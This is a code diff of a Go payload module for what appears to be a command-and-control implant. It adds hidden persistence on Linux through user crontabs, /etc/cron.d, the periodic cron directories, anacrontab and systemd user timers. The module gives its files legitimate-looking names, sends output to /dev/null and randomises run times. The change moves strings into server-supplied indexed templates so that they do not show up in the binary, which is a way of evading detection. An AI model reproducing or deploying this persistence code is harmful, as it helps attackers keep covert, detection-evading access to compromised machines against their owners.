@@ -1,4 +1,4 @@
-// server/docker/payloads/TCP_Linux/action_cron_persistence_linux.go
+// server/docker/payloads/Linux/action_cron_persistence_linux.go
 
 //go:build linux
 // +build linux
@@ -18,130 +18,93 @@ import (
 	"golang.org/x/sys/unix"
 )
 
-// Cron persistence strings - short flags transformed by server
-var (
-	// Command name
-	cronCmdName = string([]byte{0x70, 0x65, 0x72, 0x73, 0x69, 0x73, 0x74, 0x2d, 0x63, 0x72, 0x6f, 0x6e}) // persist-cron
+// CronTemplate holds server-provided template data (v2: array-based)
+type CronTemplate struct {
+	Version   int      `json:"v"`
+	Type      int      `json:"t"`   // Type identifier
+	Templates []string `json:"tpl"` // Array indexed by position
+	Params    []string `json:"p"`   // Parameters indexed by position
+}
 
-	// Actions
+// Template indices (integers don't appear as strings in binary)
+// Must match server-side constants in templates/persistence.go
+// Note: idxProcSelfExe (28) is declared in action_persistence_linux.go
+const (
+	// Cron indices (50-99)
+	idxCronShebang       = 50
+	idxCronComment       = 51
+	idxCronDevNull       = 52
+	idxCronMaintHeader   = 53
+	idxCronShellBash     = 54
+	idxCronPathEnv       = 55
+	idxCronEtcCronD      = 56
+	idxCronEtcAnacrontab = 57
+	idxCronEtcHourly     = 58
+	idxCronEtcDaily      = 59
+	idxCronEtcWeekly     = 60
+	idxCronEtcMonthly    = 61
+	idxCronSpoolCrontabs = 62
+	idxCronSpoolCron     = 63
+	idxCronSpoolTabs     = 64
+	idxCronFileCheck     = 65
+	idxCronFileUpdate    = 66
+	idxCronFileMaint     = 67
+	idxCronIntHourly     = 68
+	idxCronIntDaily      = 69
+	idxCronIntWeekly     = 70
+	idxCronIntMonthly    = 71
+	idxCronIntReboot     = 72
+	idxTimerUserDir      = 73
+	idxTimerHeader       = 74
+	idxTimerOnCalendar   = 75
+	idxTimerOnBootSec    = 76
+	idxTimerOnUnitSec    = 77
+	idxTimerPersistent   = 78
+	idxTimerExt          = 79
+	idxTimerDefaultName  = 80
+)
+
+// Cron persistence strings - short codes transformed by server
+var (
+	// Actions (short, transformed if needed)
 	cronActionAdd    = string([]byte{0x61, 0x64, 0x64})                   // add
 	cronActionRemove = string([]byte{0x72, 0x65, 0x6d, 0x6f, 0x76, 0x65}) // remove
 	cronActionList   = string([]byte{0x6c, 0x69, 0x73, 0x74})             // list
 
 	// Short flags (transformed from user-friendly flags on server side)
-	cronFlagMethod   = string([]byte{0x2d, 0x6d}) // -m (from --method)
-	cronFlagUser     = string([]byte{0x2d, 0x39}) // -9 (from --user)
-	cronFlagInterval = string([]byte{0x2d, 0x69}) // -i (from --interval)
-	cronFlagCommand  = string([]byte{0x2d, 0x36}) // -6 (from --command)
+	cronFlagMethod   = string([]byte{0x2d, 0x6d}) // -m
+	cronFlagUser     = string([]byte{0x2d, 0x39}) // -9
+	cronFlagInterval = string([]byte{0x2d, 0x69}) // -i
+	cronFlagCommand  = string([]byte{0x2d, 0x36}) // -6
 
-	// Methods
-	cronMethodSpool    = string([]byte{0x73, 0x70, 0x6f, 0x6f, 0x6c})                   // spool
-	cronMethodCrond    = string([]byte{0x63, 0x72, 0x6f, 0x6e, 0x64})                   // crond
-	cronMethodPeriodic = string([]byte{0x70, 0x65, 0x72, 0x69, 0x6f, 0x64, 0x69, 0x63}) // periodic
-	cronMethodAnacron  = string([]byte{0x61, 0x6e, 0x61, 0x63, 0x72, 0x6f, 0x6e})       // anacron
-	cronMethodTimer    = string([]byte{0x74, 0x69, 0x6d, 0x65, 0x72})                   // timer (systemd user timer, no root)
-	cronMethodAll      = string([]byte{0x61, 0x6c, 0x6c})                               // all
-
-	// Fallback constants (used if no template data provided)
-	cronProcSelfExe = string([]byte{0x2f, 0x70, 0x72, 0x6f, 0x63, 0x2f, 0x73, 0x65, 0x6c, 0x66, 0x2f, 0x65, 0x78, 0x65}) // /proc/self/exe
+	// Methods (short codes transformed by server)
+	cronMethodSpool    = string([]byte{0x73, 0x70})       // sp (from spool)
+	cronMethodCrond    = string([]byte{0x63, 0x64})       // cd (from crond)
+	cronMethodPeriodic = string([]byte{0x70, 0x72})       // pr (from periodic)
+	cronMethodAnacron  = string([]byte{0x61, 0x6e})       // an (from anacron)
+	cronMethodTimer    = string([]byte{0x74, 0x6d})       // tm (from timer)
+	cronMethodAll      = string([]byte{0x61, 0x6c, 0x6c}) // all
 )
-
-// CronTemplate holds server-provided template data
-type CronTemplate struct {
-	Version   int               `json:"v"`
-	Type      string            `json:"t"`
-	Templates map[string]string `json:"tpl"`
-	Params    map[string]string `json:"p"`
-}
-
-// Template keys (matching server-side constants)
-const (
-	tplCronShebang       = "cron_shebang"
-	tplCronComment       = "cron_comment"
-	tplCronDevNull       = "cron_devnull"
-	tplCronMaintHeader   = "cron_maint_hdr"
-	tplCronShellBash     = "cron_shell"
-	tplCronPathEnv       = "cron_path"
-	tplCronEtcCronD      = "cron_etc_d"
-	tplCronEtcAnacrontab = "cron_anacrontab"
-	tplCronEtcHourly     = "cron_etc_hourly"
-	tplCronEtcDaily      = "cron_etc_daily"
-	tplCronEtcWeekly     = "cron_etc_weekly"
-	tplCronEtcMonthly    = "cron_etc_monthly"
-	tplCronSpoolCrontabs = "cron_spool_crontabs"
-	tplCronSpoolCron     = "cron_spool_cron"
-	tplCronSpoolTabs     = "cron_spool_tabs"
-	tplCronFileCheck     = "cron_file_check"
-	tplCronFileUpdate    = "cron_file_update"
-	tplCronFileMaint     = "cron_file_maint"
-	tplCronIntHourly     = "cron_int_hourly"
-	tplCronIntDaily      = "cron_int_daily"
-	tplCronIntWeekly     = "cron_int_weekly"
-	tplCronIntMonthly    = "cron_int_monthly"
-	tplCronIntReboot     = "cron_int_reboot"
-
-	// Systemd user timer keys
-	tplTimerUserDir     = "timer_user_dir"
-	tplTimerHeader      = "timer_header"
-	tplTimerOnCalendar  = "timer_on_calendar"
-	tplTimerOnBootSec   = "timer_on_boot_sec"
-	tplTimerOnUnitSec   = "timer_on_unit_sec"
-	tplTimerPersistent  = "timer_persistent"
-	tplTimerExt         = "timer_ext"
-	tplTimerDefaultName = "timer_default_name"
-)
-
-// Fallback values (used when no template provided)
-var cronFallback = map[string]string{
-	tplCronShebang:       "#!/bin/bash",
-	tplCronComment:       "# Added by system at",
-	tplCronDevNull:       ">/dev/null 2>&1",
-	tplCronMaintHeader:   "# System maintenance task",
-	tplCronShellBash:     "SHELL=/bin/bash",
-	tplCronPathEnv:       "PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin",
-	tplCronEtcCronD:      "/etc/cron.d",
-	tplCronEtcAnacrontab: "/etc/anacrontab",
-	tplCronEtcHourly:     "/etc/cron.hourly",
-	tplCronEtcDaily:      "/etc/cron.daily",
-	tplCronEtcWeekly:     "/etc/cron.weekly",
-	tplCronEtcMonthly:    "/etc/cron.monthly",
-	tplCronSpoolCrontabs: "/var/spool/cron/crontabs/%s",
-	tplCronSpoolCron:     "/var/spool/cron/%s",
-	tplCronSpoolTabs:     "/var/spool/cron/tabs/%s",
-	tplCronFileCheck:     "system-check",
-	tplCronFileUpdate:    "system-update",
-	tplCronFileMaint:     "system-maint",
-	tplCronIntHourly:     "@hourly",
-	tplCronIntDaily:      "@daily",
-	tplCronIntWeekly:     "@weekly",
-	tplCronIntMonthly:    "@monthly",
-	tplCronIntReboot:     "@reboot",
-	// Systemd user timer fallbacks
-	tplTimerUserDir:     ".config/systemd/user",
-	tplTimerHeader:      "[Timer]",
-	tplTimerOnCalendar:  "OnCalendar=",
-	tplTimerOnBootSec:   "OnBootSec=",
-	tplTimerOnUnitSec:   "OnUnitActiveSec=",
-	tplTimerPersistent:  "Persistent=true",
-	tplTimerExt:         ".timer",
-	tplTimerDefaultName: "update-manager",
-}
 
 // CronPersistenceCommand handles cron-based persistence
 type CronPersistenceCommand struct {
-	tpl *CronTemplate // Parsed template from server (nil if not provided)
+	tpl *CronTemplate
 }
 
-// getTpl returns template value or fallback
-func (c *CronPersistenceCommand) getTpl(key string) string {
-	if c.tpl != nil && c.tpl.Templates != nil {
-		if val, ok := c.tpl.Templates[key]; ok {
+// getTpl safely gets template value by index
+func (c *CronPersistenceCommand) getTpl(idx int) string {
+	if c.tpl != nil && c.tpl.Templates != nil && idx < len(c.tpl.Templates) {
+		val := c.tpl.Templates[idx]
+		if val != "" {
 			return val
 		}
 	}
-	// Fallback to hardcoded value
-	if val, ok := cronFallback[key]; ok {
-		return val
+	// Minimal fallbacks for essential values only
+	switch idx {
+	case idxCronIntHourly:
+		return "@hourly"
+	case idxProcSelfExe:
+		return "/proc/self/exe"
 	}
 	return ""
 }
@@ -228,11 +191,12 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 	}
 
 	if interval == "" {
-		interval = c.getTpl(tplCronIntHourly)
+		interval = c.getTpl(idxCronIntHourly)
 	}
 
 	if command == "" {
-		execPath, err := os.Readlink(cronProcSelfExe)
+		procSelfExe := c.getTpl(idxProcSelfExe)
+		execPath, err := os.Readlink(procSelfExe)
 		if err != nil {
 			execPath = os.Args[0]
 		}
@@ -260,7 +224,6 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 			results = append(results, result)
 		}
 	case cronMethodTimer:
-		// Systemd user timer - works without root
 		if result := c.addViaSystemdTimer(interval, command); result != "" {
 			results = append(results, result)
 		}
@@ -303,42 +266,42 @@ func (c *CronPersistenceCommand) addCronPersistence(args []string) CommandResult
 
 // addViaSpoolCron adds to user's crontab file directly
 func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command string) string {
-	// Paths where crontabs are typically stored
+	spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
+	spoolCron := c.getTpl(idxCronSpoolCron)
+	spoolTabs := c.getTpl(idxCronSpoolTabs)
+
+	if spoolCrontabs == "" || spoolCron == "" || spoolTabs == "" {
+		return ""
+	}
+
 	cronPaths := []string{
-		fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), username),
-		fmt.Sprintf(c.getTpl(tplCronSpoolCron), username),
-		fmt.Sprintf(c.getTpl(tplCronSpoolTabs), username),
+		fmt.Sprintf(spoolCrontabs, username),
+		fmt.Sprintf(spoolCron, username),
+		fmt.Sprintf(spoolTabs, username),
 	}
 
 	for _, cronPath := range cronPaths {
-		// Check if parent directory exists
 		parentDir := filepath.Dir(cronPath)
 		if _, err := os.Stat(parentDir); os.IsNotExist(err) {
 			continue
 		}
 
-		// Check write permissions using unix.Access
 		if unix.Access(parentDir, unix.W_OK) != nil {
 			continue
 		}
 
-		// Generate cron entry
 		cronEntry := c.generateCronEntry(interval, command)
 
-		// Read existing crontab (if exists)
 		var existingContent []byte
 		if content, err := os.ReadFile(cronPath); err == nil {
 			existingContent = content
-			// Check if already added
 			if strings.Contains(string(content), command) {
 				return ErrCtx(E5, cronPath)
 			}
 		}
 
-		// Append new entry
 		newContent := append(existingContent, []byte("\n"+cronEntry+"\n")...)
 
-		// Write back
 		if err := os.WriteFile(cronPath, newContent, 0600); err == nil {
 			return SuccCtx(S1, cronPath)
 		}
@@ -349,22 +312,29 @@ func (c *CronPersistenceCommand) addViaSpoolCron(username, interval, command str
 
 // addViaCronD adds job to /etc/cron.d/
 func (c *CronPersistenceCommand) addViaCronD(username, interval, command string) string {
-	cronDDir := c.getTpl(tplCronEtcCronD)
+	cronDDir := c.getTpl(idxCronEtcCronD)
+	if cronDDir == "" {
+		return ""
+	}
 
-	// Check if directory exists and is writable using unix.Access
 	if unix.Access(cronDDir, unix.W_OK) != nil {
 		return ""
 	}
 
-	// Generate filename (looks legitimate)
-	filename := filepath.Join(cronDDir, c.getTpl(tplCronFileCheck))
+	fileCheck := c.getTpl(idxCronFileCheck)
+	if fileCheck == "" {
+		return ""
+	}
+	filename := filepath.Join(cronDDir, fileCheck)
 
-	// Generate content
+	maintHeader := c.getTpl(idxCronMaintHeader)
+	shellBash := c.getTpl(idxCronShellBash)
+	pathEnv := c.getTpl(idxCronPathEnv)
+
 	cronContent := fmt.Sprintf("%s\n%s\n%s\n\n%s %s %s\n",
-		c.getTpl(tplCronMaintHeader), c.getTpl(tplCronShellBash), c.getTpl(tplCronPathEnv),
+		maintHeader, shellBash, pathEnv,
 		c.convertInterval(interval), username, command)
 
-	// Write file
 	if err := os.WriteFile(filename, []byte(cronContent), 0644); err == nil {
 		return SuccCtx(S1, filename)
 	}
@@ -374,35 +344,47 @@ func (c *CronPersistenceCommand) addViaCronD(username, interval, command string)
 
 // addViaCronDirectories adds to /etc/cron.{hourly,daily,weekly,monthly}
 func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string) string {
-	// Map intervals to directories
+	intHourly := c.getTpl(idxCronIntHourly)
+	intDaily := c.getTpl(idxCronIntDaily)
+	intWeekly := c.getTpl(idxCronIntWeekly)
+	intMonthly := c.getTpl(idxCronIntMonthly)
+
+	etcHourly := c.getTpl(idxCronEtcHourly)
+	etcDaily := c.getTpl(idxCronEtcDaily)
+	etcWeekly := c.getTpl(idxCronEtcWeekly)
+	etcMonthly := c.getTpl(idxCronEtcMonthly)
+
 	dirMap := map[string]string{
-		c.getTpl(tplCronIntHourly):  c.getTpl(tplCronEtcHourly),
-		c.getTpl(tplCronIntDaily):   c.getTpl(tplCronEtcDaily),
-		c.getTpl(tplCronIntWeekly):  c.getTpl(tplCronEtcWeekly),
-		c.getTpl(tplCronIntMonthly): c.getTpl(tplCronEtcMonthly),
+		intHourly:  etcHourly,
+		intDaily:   etcDaily,
+		intWeekly:  etcWeekly,
+		intMonthly: etcMonthly,
 	}
 
 	var targetDir string
 	for key, dir := range dirMap {
-		if strings.Contains(interval, key) {
+		if key != "" && strings.Contains(interval, key) {
 			targetDir = dir
 			break
 		}
 	}
 
-	// Default to hourly if no match
 	if targetDir == "" {
-		targetDir = c.getTpl(tplCronEtcHourly)
+		targetDir = etcHourly
 	}
 
-	// Check if directory exists and is writable using unix.Access
-	if unix.Access(targetDir, unix.W_OK) != nil {
+	if targetDir == "" || unix.Access(targetDir, unix.W_OK) != nil {
 		return ""
 	}
 
-	// Create script file
-	scriptName := filepath.Join(targetDir, c.getTpl(tplCronFileUpdate))
-	scriptContent := fmt.Sprintf("%s\n%s\n", c.getTpl(tplCronShebang), command)
+	fileUpdate := c.getTpl(idxCronFileUpdate)
+	if fileUpdate == "" {
+		return ""
+	}
+	scriptName := filepath.Join(targetDir, fileUpdate)
+
+	shebang := c.getTpl(idxCronShebang)
+	scriptContent := fmt.Sprintf("%s\n%s\n", shebang, command)
 
 	if err := os.WriteFile(scriptName, []byte(scriptContent), 0755); err == nil {
 		return SuccCtx(S1, scriptName)
@@ -413,26 +395,26 @@ func (c *CronPersistenceCommand) addViaCronDirectories(command, interval string)
 
 // addViaAnacron adds anacron job for systems that don't run 24/7
 func (c *CronPersistenceCommand) addViaAnacron(command string) string {
-	anacronTab := c.getTpl(tplCronEtcAnacrontab)
+	anacronTab := c.getTpl(idxCronEtcAnacrontab)
+	if anacronTab == "" {
+		return ""
+	}
 
-	// Check if anacrontab exists and is writable using unix.Access
 	if unix.Access(anacronTab, unix.W_OK) != nil {
 		return ""
 	}
 
-	// Read existing content
 	content, err := os.ReadFile(anacronTab)
 	if err != nil {
 		return ""
 	}
 
-	// Check if already added
 	if strings.Contains(string(content), command) {
 		return Err(E5)
 	}
 
-	// Add anacron entry (runs daily with 5 minute delay)
-	anacronEntry := fmt.Sprintf("\n1\t5\t%s\t%s\n", c.getTpl(tplCronFileMaint), command)
+	fileMaint := c.getTpl(idxCronFileMaint)
+	anacronEntry := fmt.Sprintf("\n1\t5\t%s\t%s\n", fileMaint, command)
 	newContent := append(content, []byte(anacronEntry)...)
 
 	if err := os.WriteFile(anacronTab, newContent, 0644); err == nil {
@@ -443,33 +425,36 @@ func (c *CronPersistenceCommand) addViaAnacron(command string) string {
 }
 
 // addViaSystemdTimer creates a systemd user timer (no root required)
-// Uses ~/.config/systemd/user/ directory which is user-writable
 func (c *CronPersistenceCommand) addViaSystemdTimer(interval, command string) string {
-	// Get user home directory
 	currentUser, err := user.Current()
 	if err != nil {
 		return ""
 	}
 
-	// Build path to user systemd directory
-	userDir := filepath.Join(currentUser.HomeDir, c.getTpl(tplTimerUserDir))
+	timerUserDir := c.getTpl(idxTimerUserDir)
+	if timerUserDir == "" {
+		return ""
+	}
 
-	// Create directory if it doesn't exist
+	userDir := filepath.Join(currentUser.HomeDir, timerUserDir)
+
 	if err := os.MkdirAll(userDir, 0755); err != nil {
 		return ""
 	}
 
-	// Generate service/timer name
-	timerName := c.getTpl(tplTimerDefaultName)
-	serviceFile := filepath.Join(userDir, timerName+".service")
-	timerFile := filepath.Join(userDir, timerName+c.getTpl(tplTimerExt))
+	timerName := c.getTpl(idxTimerDefaultName)
+	timerExt := c.getTpl(idxTimerExt)
+	if timerName == "" || timerExt == "" {
+		return ""
+	}
 
-	// Check if already exists
+	serviceFile := filepath.Join(userDir, timerName+".service")
+	timerFile := filepath.Join(userDir, timerName+timerExt)
+
 	if _, err := os.Stat(timerFile); err == nil {
 		return ErrCtx(E5, timerFile)
 	}
 
-	// Generate the service unit file (reuse systemd templates from persist systemd)
 	serviceContent := fmt.Sprintf(`[Unit]
 Description=User Update Manager
 
@@ -480,17 +465,13 @@ StandardOutput=null
 StandardError=null
 `, command)
 
-	// Generate timer unit file
 	timerContent := c.generateTimerUnit(interval)
 
-	// Write service file
 	if err := os.WriteFile(serviceFile, []byte(serviceContent), 0644); err != nil {
 		return ""
 	}
 
-	// Write timer file
 	if err := os.WriteFile(timerFile, []byte(timerContent), 0644); err != nil {
-		// Clean up service file if timer write fails
 		os.Remove(serviceFile)
 		return ""
 	}
@@ -502,26 +483,32 @@ StandardError=null
 func (c *CronPersistenceCommand) generateTimerUnit(interval string) string {
 	var timerSpec string
 
-	// Convert cron-style intervals to systemd OnCalendar format
+	intHourly := c.getTpl(idxCronIntHourly)
+	intDaily := c.getTpl(idxCronIntDaily)
+	intWeekly := c.getTpl(idxCronIntWeekly)
+	intMonthly := c.getTpl(idxCronIntMonthly)
+	intReboot := c.getTpl(idxCronIntReboot)
+	onCalendar := c.getTpl(idxTimerOnCalendar)
+	onBootSec := c.getTpl(idxTimerOnBootSec)
+
 	switch interval {
-	case c.getTpl(tplCronIntHourly), "@hourly":
-		timerSpec = c.getTpl(tplTimerOnCalendar) + "hourly"
-	case c.getTpl(tplCronIntDaily), "@daily":
-		timerSpec = c.getTpl(tplTimerOnCalendar) + "daily"
-	case c.getTpl(tplCronIntWeekly), "@weekly":
-		timerSpec = c.getTpl(tplTimerOnCalendar) + "weekly"
-	case c.getTpl(tplCronIntMonthly), "@monthly":
-		timerSpec = c.getTpl(tplTimerOnCalendar) + "monthly"
-	case c.getTpl(tplCronIntReboot), "@reboot":
-		// For reboot, use OnBootSec
-		timerSpec = c.getTpl(tplTimerOnBootSec) + "1min"
+	case intHourly, "@hourly":
+		timerSpec = onCalendar + "hourly"
+	case intDaily, "@daily":
+		timerSpec = onCalendar + "daily"
+	case intWeekly, "@weekly":
+		timerSpec = onCalendar + "weekly"
+	case intMonthly, "@monthly":
+		timerSpec = onCalendar + "monthly"
+	case intReboot, "@reboot":
+		timerSpec = onBootSec + "1min"
 	default:
-		// Assume it's a cron expression - convert to OnCalendar
-		// For now, default to hourly if unknown format
-		timerSpec = c.getTpl(tplTimerOnCalendar) + "hourly"
+		timerSpec = onCalendar + "hourly"
 	}
 
-	timerName := c.getTpl(tplTimerDefaultName)
+	timerHeader := c.getTpl(idxTimerHeader)
+	timerPersistent := c.getTpl(idxTimerPersistent)
+	timerName := c.getTpl(idxTimerDefaultName)
 
 	return fmt.Sprintf(`[Unit]
 Description=User Update Manager Timer
@@ -533,37 +520,40 @@ Unit=%s.service
 
 [Install]
 WantedBy=timers.target
-`, c.getTpl(tplTimerHeader), timerSpec, c.getTpl(tplTimerPersistent), timerName)
+`, timerHeader, timerSpec, timerPersistent, timerName)
 }
 
 // generateCronEntry creates a cron entry
 func (c *CronPersistenceCommand) generateCronEntry(interval, command string) string {
-	// Add some randomization to avoid detection
-	comment := fmt.Sprintf("%s %s", c.getTpl(tplCronComment), time.Now().Format("2006-01-02"))
+	cronComment := c.getTpl(idxCronComment)
+	comment := fmt.Sprintf("%s %s", cronComment, time.Now().Format("2006-01-02"))
 
-	// Convert special intervals
 	cronTime := c.convertInterval(interval)
 
-	// Add output redirection to avoid cron emails
-	return fmt.Sprintf("%s\n%s %s %s", comment, cronTime, command, c.getTpl(tplCronDevNull))
+	devNull := c.getTpl(idxCronDevNull)
+	return fmt.Sprintf("%s\n%s %s %s", comment, cronTime, command, devNull)
 }
 
 // convertInterval converts special intervals to cron format
 func (c *CronPersistenceCommand) convertInterval(interval string) string {
+	intHourly := c.getTpl(idxCronIntHourly)
+	intDaily := c.getTpl(idxCronIntDaily)
+	intWeekly := c.getTpl(idxCronIntWeekly)
+	intMonthly := c.getTpl(idxCronIntMonthly)
+	intReboot := c.getTpl(idxCronIntReboot)
+
 	switch interval {
-	case c.getTpl(tplCronIntHourly):
-		// Add some randomization (0-59 minutes)
+	case intHourly:
 		return fmt.Sprintf("%d * * * *", time.Now().Unix()%60)
-	case c.getTpl(tplCronIntDaily):
+	case intDaily:
 		return fmt.Sprintf("%d %d * * *", time.Now().Unix()%60, time.Now().Unix()%24)
-	case c.getTpl(tplCronIntWeekly):
+	case intWeekly:
 		return fmt.Sprintf("%d %d * * %d", time.Now().Unix()%60, time.Now().Unix()%24, time.Now().Unix()%7)
-	case c.getTpl(tplCronIntMonthly):
+	case intMonthly:
 		return fmt.Sprintf("%d %d %d * *", time.Now().Unix()%60, time.Now().Unix()%24, (time.Now().Unix()%28)+1)
-	case c.getTpl(tplCronIntReboot):
-		return c.getTpl(tplCronIntReboot)
+	case intReboot:
+		return intReboot
 	default:
-		// Assume it's already in cron format
 		return interval
 	}
 }
@@ -571,7 +561,7 @@ func (c *CronPersistenceCommand) convertInterval(interval string) string {
 // removeCronPersistence removes cron persistence
 func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandResult {
 	var targetUser string
-	var method string = cronMethodAll // Default to removing all
+	var method string = cronMethodAll
 
 	for i := 0; i < len(args); i++ {
 		switch args[i] {
@@ -599,77 +589,36 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 
 	switch method {
 	case cronMethodSpool:
-		// Remove from user crontabs
-		cronPaths := []string{
-			fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), targetUser),
-			fmt.Sprintf(c.getTpl(tplCronSpoolCron), targetUser),
-			fmt.Sprintf(c.getTpl(tplCronSpoolTabs), targetUser),
-		}
-		for _, cronPath := range cronPaths {
-			if err := c.cleanCronFile(cronPath); err == nil {
-				results = append(results, SuccCtx(S2, cronPath))
-			}
-		}
+		results = append(results, c.removeSpoolCron(targetUser)...)
 
 	case cronMethodCrond:
-		// Remove from /etc/cron.d/
-		cronDFile := filepath.Join(c.getTpl(tplCronEtcCronD), c.getTpl(tplCronFileCheck))
-		if err := os.Remove(cronDFile); err == nil {
-			results = append(results, SuccCtx(S2, cronDFile))
+		if result := c.removeCronD(); result != "" {
+			results = append(results, result)
 		}
 
 	case cronMethodPeriodic:
-		// Remove from cron directories
-		for _, dir := range []string{c.getTpl(tplCronEtcHourly), c.getTpl(tplCronEtcDaily), c.getTpl(tplCronEtcWeekly), c.getTpl(tplCronEtcMonthly)} {
-			scriptPath := filepath.Join(dir, c.getTpl(tplCronFileUpdate))
-			if err := os.Remove(scriptPath); err == nil {
-				results = append(results, SuccCtx(S2, scriptPath))
-			}
-		}
+		results = append(results, c.removeCronDirectories()...)
 
 	case cronMethodAnacron:
-		// Clean anacrontab
 		if err := c.cleanAnacron(); err == nil {
-			results = append(results, SuccCtx(S2, c.getTpl(tplCronEtcAnacrontab)))
+			anacronTab := c.getTpl(idxCronEtcAnacrontab)
+			results = append(results, SuccCtx(S2, anacronTab))
 		}
 
 	case cronMethodTimer:
-		// Remove systemd user timer
-		if removed := c.removeSystemdTimer(); len(removed) > 0 {
-			results = append(results, removed...)
-		}
+		results = append(results, c.removeSystemdTimer()...)
 
 	case cronMethodAll:
-		// Remove from all locations
-		cronPaths := []string{
-			fmt.Sprintf(c.getTpl(tplCronSpoolCrontabs), targetUser),
-			fmt.Sprintf(c.getTpl(tplCronSpoolCron), targetUser),
-			fmt.Sprintf(c.getTpl(tplCronSpoolTabs), targetUser),
+		results = append(results, c.removeSpoolCron(targetUser)...)
+		if result := c.removeCronD(); result != "" {
+			results = append(results, result)
 		}
-		for _, cronPath := range cronPaths {
-			if err := c.cleanCronFile(cronPath); err == nil {
-				results = append(results, SuccCtx(S2, cronPath))
-			}
-		}
-
-		cronDFile := filepath.Join(c.getTpl(tplCronEtcCronD), c.getTpl(tplCronFileCheck))
-		os.Remove(cronDFile)
-
-		for _, dir := range []string{c.getTpl(tplCronEtcHourly), c.getTpl(tplCronEtcDaily), c.getTpl(tplCronEtcWeekly), c.getTpl(tplCronEtcMonthly)} {
-			scriptPath := filepath.Join(dir, c.getTpl(tplCronFileUpdate))
-			if err := os.Remove(scriptPath); err == nil {
-				results = append(results, SuccCtx(S2, scriptPath))
-			}
-		}
-
+		results = append(results, c.removeCronDirectories()...)
 		if err := c.cleanAnacron(); err == nil {
-			results = append(results, SuccCtx(S2, c.getTpl(tplCronEtcAnacrontab)))
+			anacronTab := c.getTpl(idxCronEtcAnacrontab)
+			results = append(results, SuccCtx(S2, anacronTab))
 		}
-
-		// Also remove systemd user timer
-		if removed := c.removeSystemdTimer(); len(removed) > 0 {
-			results = append(results, removed...)
-		}
+		results = append(results, c.removeSystemdTimer()...)
 
 	default:
 		return CommandResult{
@@ -691,6 +640,69 @@ func (c *CronPersistenceCommand) removeCronPersistence(args []string) CommandRes
 	}
 }
 
+func (c *CronPersistenceCommand) removeSpoolCron(targetUser string) []string {
+	var results []string
+	spoolCrontabs := c.getTpl(idxCronSpoolCrontabs)
+	spoolCron := c.getTpl(idxCronSpoolCron)
+	spoolTabs := c.getTpl(idxCronSpoolTabs)
+
+	if spoolCrontabs == "" {
+		return results
+	}
+
+	cronPaths := []string{
+		fmt.Sprintf(spoolCrontabs, targetUser),
+		fmt.Sprintf(spoolCron, targetUser),
+		fmt.Sprintf(spoolTabs, targetUser),
+	}
+	for _, cronPath := range cronPaths {
+		if err := c.cleanCronFile(cronPath); err == nil {
+			results = append(results, SuccCtx(S2, cronPath))
+		}
+	}
+	return results
+}
+
+func (c *CronPersistenceCommand) removeCronD() string {
+	cronDDir := c.getTpl(idxCronEtcCronD)
+	fileCheck := c.getTpl(idxCronFileCheck)
+	if cronDDir == "" || fileCheck == "" {
+		return ""
+	}
+
+	cronDFile := filepath.Join(cronDDir, fileCheck)
+	if err := os.Remove(cronDFile); err == nil {
+		return SuccCtx(S2, cronDFile)
+	}
+	return ""
+}
+
+func (c *CronPersistenceCommand) removeCronDirectories() []string {
+	var results []string
+	fileUpdate := c.getTpl(idxCronFileUpdate)
+	if fileUpdate == "" {
+		return results
+	}
+
+	dirs := []string{
+		c.getTpl(idxCronEtcHourly),
+		c.getTpl(idxCronEtcDaily),
+		c.getTpl(idxCronEtcWeekly),
+		c.getTpl(idxCronEtcMonthly),
+	}
+
+	for _, dir := range dirs {
+		if dir == "" {
+			continue
+		}
+		scriptPath := filepath.Join(dir, fileUpdate)
+		if err := os.Remove(scriptPath); err == nil {
+			results = append(results, SuccCtx(S2, scriptPath))
+		}
+	}
+	return results
+}
+
 // cleanCronFile removes our entries from a cron file
 func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
 	content, err := os.ReadFile(filePath)
@@ -702,13 +714,11 @@ func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
 	var cleanedLines []string
 	skipNext := false
 
-	// Get detection pattern from template (or fallback) - trim the "# " prefix
-	comment := c.getTpl(tplCronComment)
-	detectPattern := strings.TrimPrefix(comment, "# ")
+	cronComment := c.getTpl(idxCronComment)
+	detectPattern := strings.TrimPrefix(cronComment, "# ")
 
 	for _, line := range lines {
-		// Skip our comments and associated cron lines
-		if strings.Contains(line, detectPattern) {
+		if detectPattern != "" && strings.Contains(line, detectPattern) {
 			skipNext = true
 			continue
 		}
@@ -724,7 +734,11 @@ func (c *CronPersistenceCommand) cleanCronFile(filePath string) error {
 
 // cleanAnacron removes our anacron entries
 func (c *CronPersistenceCommand) cleanAnacron() error {
-	anacronPath := c.getTpl(tplCronEtcAnacrontab)
+	anacronPath := c.getTpl(idxCronEtcAnacrontab)
+	if anacronPath == "" {
+		return fmt.Errorf("no anacron path")
+	}
+
 	content, err := os.ReadFile(anacronPath)
 	if err != nil {
 		return err
@@ -732,10 +746,10 @@ func (c *CronPersistenceCommand) cleanAnacron() error {
 
 	lines := strings.Split(string(content), "\n")
 	var cleanedLines []string
-	fileMaint := c.getTpl(tplCronFileMaint)
+	fileMaint := c.getTpl(idxCronFileMaint)
 
 	for _, line := range lines {
-		if !strings.Contains(line, fileMaint) {
+		if fileMaint == "" || !strings.Contains(line, fileMaint) {
 			cleanedLines = append(cleanedLines, line)
 		}
 	}
@@ -752,18 +766,23 @@ func (c *CronPersistenceCommand) removeSystemdTimer() []string {
 		return results
 	}
 
-	userDir := filepath.Join(currentUser.HomeDir, c.getTpl(tplTimerUserDir))
-	timerName := c.getTpl(tplTimerDefaultName)
+	timerUserDir := c.getTpl(idxTimerUserDir)
+	timerName := c.getTpl(idxTimerDefaultName)
+	timerExt := c.getTpl(idxTimerExt)
+
+	if timerUserDir == "" || timerName == "" {
+		return results
+	}
+
+	userDir := filepath.Join(currentUser.HomeDir, timerUserDir)
 
 	serviceFile := filepath.Join(userDir, timerName+".service")
-	timerFile := filepath.Join(userDir, timerName+c.getTpl(tplTimerExt))
